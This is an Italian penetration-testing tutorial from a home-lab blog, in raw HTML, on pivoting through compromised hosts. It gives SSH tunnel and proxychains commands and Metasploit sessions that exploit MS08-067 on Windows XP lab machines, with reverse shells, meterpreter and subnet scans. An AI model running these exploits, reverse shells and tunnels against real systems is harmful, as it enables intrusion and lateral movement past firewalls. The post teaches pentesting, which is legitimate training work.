<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SSH e Meterpeter pivoting | HomeLab IT</title><meta name=keywords content="kalilinux,Linux,metasploit,meterpeter,penetration test,pivoting,Security,ssh"><meta name=description content="Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “Pivoting“.
Pivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).
Faccio un piccolo esempio in cui ci sono tre attori:
 Client (attaccante) Server A – Accetta qualsiasi connessione Server B – Accetta esclusivamente connessione dal server A  Instradare le connessioni tramite il server compromesso A, verso il server B, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation."><meta name=author content="claudio"><link rel=canonical href=https://www.homelab.it/index.php/2016/04/21/metasploit-ssh-meterpeter-pivoting/><link crossorigin=anonymous href=/assets/css/stylesheet.min.48a18943c2fc15c38a372b8dde1f5e5dc0bc64fa6cb90f5a817d2f8c76b7f3ae.css integrity="sha256-SKGJQ8L8FcOKNyuN3h9eXcC8ZPpsuQ9agX0vjHa3864=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://www.homelab.it/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="SSH e Meterpeter pivoting"><meta property="og:description" content="Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “Pivoting“.
Pivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).
Faccio un piccolo esempio in cui ci sono tre attori:
 Client (attaccante) Server A – Accetta qualsiasi connessione Server B – Accetta esclusivamente connessione dal server A  Instradare le connessioni tramite il server compromesso A, verso il server B, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation."><meta property="og:type" content="article"><meta property="og:url" content="https://www.homelab.it/index.php/2016/04/21/metasploit-ssh-meterpeter-pivoting/"><meta property="og:image" content="https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2016-04-21T19:34:53+00:00"><meta property="article:modified_time" content="2016-04-21T19:34:53+00:00"><meta property="og:site_name" content="HomeLab IT"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="SSH e Meterpeter pivoting"><meta name=twitter:description content="Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “Pivoting“.
Pivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).
Faccio un piccolo esempio in cui ci sono tre attori:
 Client (attaccante) Server A – Accetta qualsiasi connessione Server B – Accetta esclusivamente connessione dal server A  Instradare le connessioni tramite il server compromesso A, verso il server B, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://www.homelab.it/posts/"},{"@type":"ListItem","position":2,"name":"SSH e Meterpeter pivoting","item":"https://www.homelab.it/index.php/2016/04/21/metasploit-ssh-meterpeter-pivoting/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SSH e Meterpeter pivoting","name":"SSH e Meterpeter pivoting","description":"Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “Pivoting“.\nPivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).\nFaccio un piccolo esempio in cui ci sono tre attori:\n Client (attaccante) Server A – Accetta qualsiasi connessione Server B – Accetta esclusivamente connessione dal server A  Instradare le connessioni tramite il server compromesso A, verso il server B, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation.","keywords":["kalilinux","Linux","metasploit","meterpeter","penetration test","pivoting","Security","ssh"],"articleBody":"Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “Pivoting“.\nPivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).\nFaccio un piccolo esempio in cui ci sono tre attori:\n Client (attaccante) Server A – Accetta qualsiasi connessione Server B – Accetta esclusivamente connessione dal server A  Instradare le connessioni tramite il server compromesso A, verso il server B, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation.\nPossiamo considerare questi instradamenti come veri e propri forward.\nSSH Pivoting Tramite il protocollo ssh è possibile creare dei tunnels per redirigere il traffico di una o più porte tcp, l’unico requisito obbligatorio è l’opzione “AllowTcpForwarding” abilitata nella configurazione del server sshd.\nNon è prettamente necessario un’ account privilegiato.\nPer creare tunnel ssh le opzioni da utilizzare nel client sono:\n [-L [bind_address:]port:host:hostport] — Forward di una singola porta\n[-D [bind_address:]port] — Forward di porte dinamiche\n[-R [bind_address:]port:host:hostport] — Reverse Tunnel\n Di seguito riporterò alcuni esempi, per cominciare il forward di una singola porta:\n# Tunnel che permette di collegarsi sulla porta 80 del server 10.0.0.10 tramite 10.0.0.101\r#\r# Senza specificare il bind_address la porta 8080 è raggiungibile solo da localhost\rclaudio@KaliCla:~$ ssh -L8080:10.0.0.10:80 user@10.0.0.101\rclaudio@KaliCla:~$\rclaudio@KaliCla:~$ curl http://127.0.0.1:8080 SSH Proxy socks :\n# Tunnel che crea un socks proxy sulla porta 8080 tramite 83.149.x.x\r#\r# Senza specificare il bind_address la porta 8080 è raggiungibile solo da localhost\rclaudio@KaliCla:~$ ssh -D 8080 root@83.149.x.x # Controllo ip personale claudio@KaliCla:~$ curl http://ifconfig.me\r2.236.x.x\r# Testo il proxy socks appena creato\rclaudio@KaliCla:~$ curl --socks5 127.0.0.1:8080 http://ifconfig.me\r83.149.x.x Proxychain è un tool che permette di eseguire qualsiasi programma attraverso http o socks proxy, quindi è possibile configurarlo in modo tale da utilizzare il tunnel dinamico creato precedentemente.\nDi default proxychains è configurato per utilizzare come socks server TOR.\nModificare la parte finale del file /etc/proxychains.conf così:\n[ProxyList]\r# add proxy here ...\r# meanwile\r# defaults set to \"tor\"\r#socks4 127.0.0.1 9050\rsocks4 127.0.0.1 8080 Per eseguire proxychains basta anteporlo al programma desiderato:\nclaudio@KaliCla:~$ proxychains curl http://ifconfig.me\rProxyChains-3.1 (http://proxychains.sf.net)\r|DNS-request| ifconfig.me |S-chain|--127.0.0.1:8080--4.2.2.2:53--OK\r|DNS-response| ifconfig.me is 153.121.72.212\r|S-chain|--127.0.0.1:8080--153.121.72.212:80--OK\r83.149.x.x\rclaudio@KaliCla:~$ Se all’interno della rete 83.149.x.x volessimo collegarci al servizio ftp del server 192.168.0.2, basterebbe digitare:\nclaudio@KaliCla:~$ proxychains telnet 192.168.0.3 21\rProxyChains-3.1 (http://proxychains.sf.net)\rTrying 192.168.0.3...\r|S-chain|--127.0.0.1:8080--192.168.0.3:21--OK\rConnected to 192.168.0.3.\rEscape character is '^]'.\r220-FileZilla Server version 0.9.36 beta\r220-written by Tim Kosse (Tim.Kosse@gmx.de)\r220 Please visit http://sourceforge.net/projects/filezilla/ Per vnc o remotedesktop:\nclaudio@KaliCla:~$ proxychains remmina\rProxyChains-3.1 (http://proxychains.sf.net)\rRemmina plugin VNC (type=Protocol) registered.\rRemmina plugin VNCI (type=Protocol) registered.\rRemmina plugin RDP (type=Protocol) registered.\rRemmina plugin RDPF (type=File) registered.\rRemmina plugin RDPS (type=Preference) registered.\rRemmina plugin SFTP (type=Protocol) registered.\rRemmina plugin SSH (type=Protocol) registered. Scansione TCP del server 192.168.0.2 tramite nmap\nclaudio@KaliCla:~$ proxychains nmap -sT 192.168.0.3\rProxyChains-3.1 (http://proxychains.sf.net)\r|S-chain|--127.0.0.1:8080--192.168.0.3:80--OK\r...\r...\rStarting Nmap 7.01 ( https://nmap.org ) at 2016-04-11 23:09 CEST\rNmap scan report for 192.168.0.3\rHost is up (0.085s latency).\rNot shown: 986 closed ports\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 2.0.5\r22/tcp open ssh OpenSSH 4.3 (protocol 2.0)\r25/tcp open smtp Sendmail 8.13.8/8.13.8\r80/tcp open http Apache httpd 2.2.3 ((CentOS))\r106/tcp open tcpwrapped\r110/tcp open pop3 Dovecot pop3d\r143/tcp open imap Dovecot imapd\r873/tcp open rsync (protocol version 30)\r993/tcp open ssl/imap Dovecot imapd\r995/tcp open ssl/pop3 Dovecot pop3d\r1110/tcp open pop3 Dovecot pop3d\r2525/tcp open smtp Sendmail 8.13.8/8.13.8\r5666/tcp open tcpwrapped\r10000/tcp open http MiniServ 1.680 (Webmin httpd) Come si può notare ci sono moltissimi modi di sfruttare i forward dinamici tramite ssh, basta ingegnarsi un minimo.\nSSH Pivoting e Metasploit Dopo un’infarinatura generale di tunnel e forward ssh, vediamo come sfruttare la tecnica pivoting per eseguire attacchi tramite il famoso framework Metasploit.\nHo deciso di suddividere questa sezione in due parti, nella prima attaccheremo un server presente nella nostra stessa subnet, mentre nella seconda la vittima risiederà in una rete differente.\nAttacco n.1 (Medesima subnet) Nel grafico precedente ho cercato di raffigurare le varie fasi dell’attacco:\nIl server A viene utilizzato per creare un tunnel ssh e raggiungere la porta 445 del server B (freccia verde) così da poter sfruttare la ormai datata vulnerabilità MS08-067 (freccia blu).\nUna volta compromesso, sul server B verrà eseguita una reverse shell verso il Client (freccia viola).\nIn questo caso il tunnel serve a bypassare il firewall del server B che blocca le connessioni dirette del Client (freccia rossa).\nTunnel Attraverso il server ssh 10.0.0.101, creo un forward tra la porta tcp locale del client 9445 e la 445 del server Windows Xp 10.0.0.20:\nclaudio@KaliCla:~$ ssh -L9445:10.0.0.20:445 user@10.0.0.101\rclaudio@10.0.0.101's password: [user@webserver01 ~]$ Preparo l’attacco Apro Metasploit, carico l’exploit, scelgo il payload, configuro i parametri.\n######## #\r################# #\r###################### #\r######################### #\r############################\r##############################\r###############################\r###############################\r##############################\r# ######## #\r## ### #### ##\r### ###\r#### ###\r#### ########## ####\r####################### ####\r#################### ####\r################## ####\r############ ##\r######## ###\r######### #####\r############ ######\r######## #########\r##### ########\r### #########\r###### ############\r#######################\r# # ### # # ##\r########################\r## ## ## ##\rhttp://metasploit.pro\rFrustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with\rMetasploit Pro -- learn more on http://rapid7.com/metasploit\r=[ metasploit v4.11.5-2016010401 ]\r+ -- --=[ 1517 exploits - 875 auxiliary - 257 post ]\r+ -- --=[ 437 payloads - 37 encoders - 8 nops ]\r+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\r# Carico l'exploit\rmsf  use exploit/windows/smb/ms08_067_netapi\r# Scelgo il payload (shell)\rmsf exploit(ms08_067_netapi)  set payload windows/shell/reverse_tcp\rpayload = windows/shell/reverse_tcp\r# Come host remoto setto il tunnel locale\r# Attenzione! Per instradare la connessione verso il tunnel utilizzare l'ip 0.0.0.0 e non 127.0.0.1\rmsf exploit(ms08_067_netapi)  set RHOST 0.0.0.0\rRHOST = 0.0.0.0\r# Come porta remota setto la porta locale del tunnel\rmsf exploit(ms08_067_netapi)  set RPORT 9445\rRPORT = 9445\r# L'ip che dovrà essere contattato dalla reverse shell è quello del client\rmsf exploit(ms08_067_netapi)  set LHOST 10.0.0.50\rLHOST = 10.0.0.50\r# Ricontrollo la configurazione\rmsf exploit(ms08_067_netapi)  show options\rModule options (exploit/windows/smb/ms08_067_netapi):\rName Current Setting Required Description\r---- --------------- -------- -----------\rRHOST 0.0.0.0 yes The target address\rRPORT 9445 yes Set the SMB service port\rSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\rPayload options (windows/shell/reverse_tcp):\rName Current Setting Required Description\r---- --------------- -------- -----------\rEXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none)\rLHOST 10.0.0.50 yes The listen address\rLPORT 4444 yes The listen port Eseguo l’attacco msf exploit(ms08_067_netapi)  exploit\r[*] Started reverse TCP handler on 10.0.0.50:4444 [*] Automatically detecting the target...\r[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\r[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\r[*] Attempting to trigger the vulnerability...\r[*] Encoded stage with x86/shikata_ga_nai\r[*] Sending encoded stage (267 bytes) to 10.0.0.20\r[*] Command shell session 1 opened (10.0.0.50:4444 - 10.0.0.20:1056) at 2016-04-12 23:21:58 +0200\rMicrosoft Windows XP [Version 5.1.2600]\r(C) Copyright 1985-2001 Microsoft Corp.\rC:\\WINDOWS\\system32ipconfig\rWindows IP Configuration\rEthernet adapter Local Area Connection 2:\rConnection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 10.0.0.20\rSubnet Mask . . . . . . . . . . . : 255.255.255.0\rDefault Gateway . . . . . . . . . :\rC:\\WINDOWS\\system32 Attacco n.2 (Subnet Differente) Questo piano d’attacco è leggermente più complesso del precedente.\nIn questa situazione il Client (10.0.0.50/24) non può attaccare direttamente il server B (192.168.222.2/24) perché si trovano in reti lan e subnet differenti.\nPer ovviare a questo problema viene sfruttato il server A, dato che quest’ultimo ha accesso sia alle rete LAN che alla LAN_02.\nIn questo caso il server A non solo eseguirà un forward delle porte, ma fungerà anche da gateway così da eseguire un routing delle connessioni tra reti differenti.\nLa procedura può essere riassunta fondamentalmente in quattro punti:\n Il client crea un tunnel ssh locale sul server A per raggiungere la porta 445 del server B (freccia verde) Il client crea un tunnel ssh inverso in modo da potersi collegare alla reverse shell del server B ospitata dal server A (freccia blu) Il client sfruttando il tunnel (punto 1) compromette il server B ed esegue la reverse shell verso il server A (freccia viola) Il client sfrutta il tunnel (punto 2) per collegarsi alla reverse shell aperta sul server A  Tunnel (pivoting) Attraverso il server ssh 10.0.0.101, creo un forward tra la porta tcp locale del client 9445 e la 445 del server Windows Xp 192.168.222.2:\nclaudio@KaliCla:~$ ssh -L9445:192.168.222.2:445 root@10.0.0.101\r# Attraverso il server ssh 10.0.0.101, creo un reverse tunnel per redirigere la porta 4444 della\r# reverse shell verso il framework metasploit del client:\r# 192.168.222.2 - 192.168.222.2.1:4444 - 10.0.0.101:4444 - 10.0.0.50:4444\rclaudio@KaliCla:~$ ssh -R 0.0.0.0:4444:127.0.0.1:4444 root@10.0.0.101  Importante!\nPer permettere anche ad host remoti di usufruire dei tunnel locali ssh, è necessario eseguire un bind delle porte verso l’indirizzo 0.0.0.0 .\nOltre a specificare l’indirizzo 0.0.0.0 è obbligatoria nella configurazione del server sshd l’opzione: GatewayPorts yes\nIn caso contrario tramite utente privilegiato l’opzione andrà abilitata.\n Preparo l’attacco Apro metasploit, carico l’exploit, scelgo il payload, configuro i parametri.\n# Carico l'exploit\rmsf  use exploit/windows/smb/ms08_067_netapi\r# Scelgo l'exploit (shell)\rmsf exploit(ms08_067_netapi)  set payload windows/shell/reverse_tcp\rpayload = windows/shell/reverse_tcp\r# Come host remoto setto il tunnel locale\rmsf exploit(ms08_067_netapi)  set RHOST 0.0.0.0\rRHOST = 0.0.0.0\r# Come porta remota setto la porta locale del tunnel\rmsf exploit(ms08_067_netapi)  set RPORT 9445\rRPORT = 9445\r# Come host remoto della reverse shell setto l'indirizzo del server pivoting (server A)\rmsf exploit(ms08_067_netapi)  set LHOST 192.168.222.1\rLHOST = 192.168.222.1\r# Controllo il riepilogo dei settaggi\rmsf exploit(ms08_067_netapi)  show options\rModule options (exploit/windows/smb/ms08_067_netapi):\rName Current Setting Required Description\r---- --------------- -------- -----------\rRHOST 0.0.0.0 yes The target address\rRPORT 9445 yes Set the SMB service port\rSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\rPayload options (windows/shell/reverse_tcp):\rName Current Setting Required Description\r---- --------------- -------- -----------\rEXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none)\rLHOST 192.168.222.1 yes The listen address\rLPORT 4444 yes The listen port\rExploit target:\rId Name\r-- ---- Eseguo l’attacco msf exploit(ms08_067_netapi)  exploit\r[-] Handler failed to bind to 192.168.222.1:4444:- -\r[*] Started reverse TCP handler on 0.0.0.0:4444 [*] Automatically detecting the target...\r[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\r[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\r[*] Attempting to trigger the vulnerability...\r[*] Encoded stage with x86/shikata_ga_nai\r[*] Sending encoded stage (267 bytes) to 127.0.0.1\r[*] Command shell session 1 opened (127.0.0.1:4444 - 127.0.0.1:49963) at 2016-04-18 22:39:03 +0200\rMicrosoft Windows XP [Version 5.1.2600]\r(C) Copyright 1985-2001 Microsoft Corp.\rC:\\WINDOWS\\system32ipconfig\ripconfig\rWindows IP Configuration\rEthernet adapter Local Area Connection 2:\rConnection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 192.168.222.2\rSubnet Mask . . . . . . . . . . . : 255.255.255.0\rDefault Gateway . . . . . . . . . : C:\\WINDOWS\\system32 Meterpeter Pivoting e Metasploit Oltre al protocollo ssh, è possibile utilizzare la tecnica pivoting sfruttando i server compromessi con metasploit.\nPer essere più precisi il componente che permette di effettuare routing di connessioni e forward delle porte è il famoso payload meterpeter.\nIl payload, come mostrato negli attacchi precedenti, non è altro che un tool che viene eseguito sulla macchina vittima subito dopo essere stata violata.\nNel caso di meterpeter il payload può essere considerato come una backdoor con moltissime utilità.\nComandi pivoting meterpeter run autoroute -s 192.168.1.0/24 # Routing di tutto il traffico verso la rete 192.168.1.x\rrun autoroute -p # Elenco delle rotte attive route add 192.168.1.0 255.255.255.0 2 # Routing verso la rete 192.168.1.x tramite sessione meterpeter 2 route del 192.168.1.0 255.255.255.0 2 # Rimuovo rotta sessione meterpeter 2 route flush # Rimuovo qualsiasi rotta portfwd add -l 222 -p 222 -r host # Forward porta 222 target compromesso verso porta 222 nuovo targer portfwd delete -l 222 -p 222 -r host # Rimozione forward porta 222 portfwd list # Lista port forwards attivi portfwd flus # Rimozione di tutti i port forwards Di seguito riporterò un esempio che mostrerà come scansionare una sotto rete raggiungibile esclusivamente da un server compromesso.\nPreparo l’attacco Apro metasploit, carico l’exploit, scelgo il payload, configuro i parametri:\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\rMMMMMMMMMMM MMMMMMMMMM\rMMMN$ vMMMM\rMMMNl MMMMM MMMMM JMMMM\rMMMNl MMMMMMMN NMMMMMMM JMMMM\rMMMNl MMMMMMMMMNmmmNMMMMMMMMM JMMMM\rMMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM\rMMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM\rMMMNI MMMMM MMMMMMM MMMMM jMMMM\rMMMNI MMMMM MMMMMMM MMMMM jMMMM\rMMMNI MMMNM MMMMMMM MMMMM jMMMM\rMMMNI WMMMM MMMMMMM MMMM# JMMMM\rMMMMR ?MMNM MMMMM .dMMMM\rMMMMNm `?MMM MMMM` dMMMMM\rMMMMMMN ?MM MM? NMMMMMN\rMMMMMMMMNe JMMMMMNMMM\rMMMMMMMMMMNm, eMMMMMNMMNMM\rMMMMNNMNMMMMMNx MMMMMMNMMNMMNM\rMMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM\rhttp://metasploit.pro\rTired of typing 'set RHOSTS'? Click \u0026 pwn with Metasploit Pro\rLearn more on http://rapid7.com/metasploit\r=[ metasploit v4.11.5-2016010401 ]\r+ -- --=[ 1517 exploits - 875 auxiliary - 257 post ]\r+ -- --=[ 437 payloads - 37 encoders - 8 nops ]\r+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\r# Carico l'exploit\rmsf  use exploit/windows/smb/ms08_067_netapi\r# Scelgo il payload meterpeter\rmsf exploit(ms08_067_netapi)  set payload windows/meterpreter/reverse_tcp\rpayload = windows/meterpreter/reverse_tcp\r# Setto l'ip remoto della macchina da compromettere\rmsf exploit(ms08_067_netapi)  set RHOST 10.0.0.62\rRHOST = 10.0.0.62\r# Setto l'ip del client per la reverse shell (meterpeter)\rmsf exploit(ms08_067_netapi)  set LHOST 10.0.0.50\rLHOST = 10.0.0.50\r# Controllo i settaggi\rmsf exploit(ms08_067_netapi)  show options\rModule options (exploit/windows/smb/ms08_067_netapi):\rName Current Setting Required Description\r---- --------------- -------- -----------\rRHOST 10.0.0.62 yes The target address\rRPORT 445 yes Set the SMB service port\rSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\rPayload options (windows/meterpreter/reverse_tcp):\rName Current Setting Required Description\r---- --------------- -------- -----------\rEXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none)\rLHOST 10.0.0.50 yes The listen address\rLPORT 4444 yes The listen port\rExploit target:\rId Name\r-- ----\r0 Automatic Targeting Eseguo l’attacco Eseguo l’exploit e acquisisco le informazioni di networking\nmsf exploit(ms08_067_netapi)  exploit\r[*] Started reverse TCP handler on 10.0.0.50:4444 [*] Automatically detecting the target...\r[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\r[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\r[*] Attempting to trigger the vulnerability...\r[*] Sending stage (957487 bytes) to 10.0.0.62\r[*] Meterpreter session 1 opened (10.0.0.50:4444 - 10.0.0.62:1035) at 2016-04-21 18:37:37 +0200\rmeterpreter \r# Controllo la configurazione delle interfacce di rete meterpreter  ipconfig\rInterface 1\r============\rName : MS TCP Loopback interface\rHardware MAC : 00:00:00:00:00:00\rMTU : 1520\rIPv4 Address : 127.0.0.1\rInterface 2\r============\rName : VMware Accelerated AMD PCNet Adapter #2 - Packet Scheduler Miniport\rHardware MAC : 00:0c:29:a8:aa:f7\rMTU : 1500\rIPv4 Address : 10.0.0.62\rIPv4 Netmask : 255.255.255.0\rInterface 3\r============\rName : VMware Accelerated AMD PCNet Adapter - Packet Scheduler Miniport\rHardware MAC : 00:0c:29:a8:aa:01\rMTU : 1500\rIPv4 Address : 192.168.222.2\rIPv4 Netmask : 255.255.255.0 Routing del traffico (pivoting) # Tramite il comando autorute di meterpeter aggiungo una route statica che permette # al framework metasploit di raggiungere tutta la rete 192.168.222.x tramite il server\r# appena compromesso (10.0.0.62).\rmeterpreter  run autoroute -s 192.168.222.0/24\r[*] Adding a route to 192.168.222.0/255.255.255.0...\r[+] Added route to 192.168.222.0/255.255.255.0 via 10.0.0.62\r[*] Use the -p option to list all active routes\r# Tramite lo switch \"-p\" del comando autoroute, visualizzo le route statiche presenti meterpreter  run autoroute -p\rActive Routing Table\r====================\rSubnet Netmask Gateway\r------ ------- -------\r192.168.222.0 255.255.255.0 Session 1\rmeterpreter \r# Premendo i tasti Ctrl+z e poi y mando la sessione in background Background session 1? [y/N]\rmsf exploit(ms08_067_netapi)  Individuazione nuovi target Carico il modulo port scanner di metasploit per scansionare la rete 192.168.222.x:\n# Carico il modulo port scanner di metasploit per scansionare la rete 192.168.222.x\rmsf exploit(ms08_067_netapi)  use auxiliary/scanner/portscan/tcp\r# Controllo le opzioni disponibili\rmsf auxiliary(tcp)  show options\rModule options (auxiliary/scanner/portscan/tcp):\rName Current Setting Required Description\r---- --------------- -------- -----------\rCONCURRENCY 10 yes The number of concurrent ports to check per host\rPORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900)\rRHOSTS yes The target address range or CIDR identifier\rTHREADS 1 yes The number of concurrent threads\rTIMEOUT 1000 yes The socket connect timeout in milliseconds\r# Setto la subnet da scansionare\rmsf auxiliary(tcp)  set RHOSTS 192.168.222.0/24\rRHOSTS = 192.168.222.0/24\r# Setto i threads da utilizzare\rmsf auxiliary(tcp)  set THREADS 50\rTHREADS = 50\r# Setto il rage di porte da interrogare\rmsf auxiliary(tcp)  set PORTS 1-60000\rPORTS = 1-60000\r# Faccio partire la scansione\rmsf auxiliary(tcp)  run\r[*] 192.168.222.2:21 - TCP OPEN\r[*] 192.168.222.3:22 - TCP OPEN\r[*] 192.168.222.2:25 - TCP OPEN\r[*] 192.168.222.3:80 - TCP OPEN\r[*] 192.168.222.2:80 - TCP OPEN\r[*] 192.168.222.2:135 - TCP OPEN\r[*] 192.168.222.2:139 - TCP OPEN\r[*] 192.168.222.2:180 - TCP OPEN\r[*] 192.168.222.3:443 - TCP OPEN\r[*] 192.168.222.2:443 - TCP OPEN\r[*] 192.168.222.2:445 - TCP OPEN\r[*] Scanned 256 of 256 hosts (100% complete)\r[*] Auxiliary module execution completed\rmsf auxiliary(tcp)  E’ possibile notare come il client (10.0.0.50) sia stato in grado di scansionare e rilevare le porte aperte del server 192.168.222.3 .\nNaturalmente oltre ad una scansione è possibile utilizzare altri exploit per compromettere ulteriori macchine.\nConclusioni Per un penetration tester la tecnica pivoting è molto importante, sia nel lavoro che nella buona riuscita di una certificazione.\nIl consiglio che posso darvi è come al solito di provare, sperimentare e documentarsi il più possibile perchè il routing delle connessioni e il forward delle porte posso essere effettuati in molti modi.\nPer qualsiasi segnalazione di errore, chiarimento o altro non esistate a commentare il post.\nAlla prossima!\n","wordCount":"2927","inLanguage":"en","datePublished":"2016-04-21T19:34:53Z","dateModified":"2016-04-21T19:34:53Z","author":{"@type":"Person","name":"claudio"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.homelab.it/index.php/2016/04/21/metasploit-ssh-meterpeter-pivoting/"},"publisher":{"@type":"Organization","name":"HomeLab IT","logo":{"@type":"ImageObject","url":"https://www.homelab.it/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.homelab.it/ accesskey=h title="Homelab IT (Alt + H)"><img src=https://www.homelab.it/img/homelabit_logo.png alt=logo aria-label=logo height=35>Homelab IT</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://www.homelab.it/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://www.homelab.it/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://www.homelab.it/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.homelab.it/>Home</a>&nbsp;»&nbsp;<a href=https://www.homelab.it/posts/>Posts</a></div><h1 class=post-title>SSH e Meterpeter pivoting</h1><div class=post-meta><span title="2016-04-21 19:34:53 +0000 +0000">April 21, 2016</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;claudio</div></header><div class=post-content><p><img loading=lazy src=../../../../../wp-content/uploads/2016/04/pivot.jpg alt=pivoting></p><p>Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “<strong>Pivoting</strong>“.<br>Pivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica 